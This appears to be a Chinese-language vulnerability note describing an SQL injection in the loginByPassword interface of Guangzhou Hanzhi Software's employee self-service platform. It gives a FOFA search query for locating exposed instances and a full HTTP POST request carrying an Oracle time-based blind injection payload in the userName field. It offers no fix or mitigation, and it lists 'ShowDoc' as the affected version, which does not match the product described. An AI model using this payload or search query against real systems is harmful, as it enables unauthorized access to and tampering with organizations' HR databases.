# 员工自助平台loginByPassword存在SQL注入漏洞

# 一、漏洞简介
 广州翰智软件有限公司员工自助平台是指该公司为其员工提供的一种在线平台，旨在提高员工的工作效率、简化人力资源管理流程、增强员工的自主权和满意度。广州翰智软件有限公司员工自助平台 loginByPassword接口处存在SQL注入漏洞，恶意攻击者可能会利用此漏洞修改数据库中的数据，例如添加、删除或修改记录，导致数据损坏或丢失。  

# 二、影响版本
+ ShowDoc

# 三、资产测绘
+ fofa`<font style="color:rgb(199, 37, 78);">body="./static/hrfonts/iconfont.css"</font>`
+ 特征

![1717127090648-66b3e7cf-d1a8-4fc5-8007-a4fdcde6ee9f.png](./img/nEpGZuhTscZgPPDk/1717127090648-66b3e7cf-d1a8-4fc5-8007-a4fdcde6ee9f-326976.png)

# 四、漏洞复现
```rust
POST /hrssc/portal/plantform/loginByPassword HTTP/1.1
Host: 
Accept: application/json, text/plain, */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Content-Type: application/json
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Content-Length: 40
Connection: close

{"userName":"admin' AND 8383=DBMS_PIPE.RECEIVE_MESSAGE(CHR(76)||CHR(98)||CHR(97)||CHR(122),5)-- eWnt","password":"admin"}
```

![1717127299072-04b69d65-65a2-42cc-a9e7-ec94f961e688.png](./img/nEpGZuhTscZgPPDk/1717127299072-04b69d65-65a2-42cc-a9e7-ec94f961e688-403036.png)



> 更新: 2024-06-01 11:14:22  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/gy1kmhftuc02g8h8>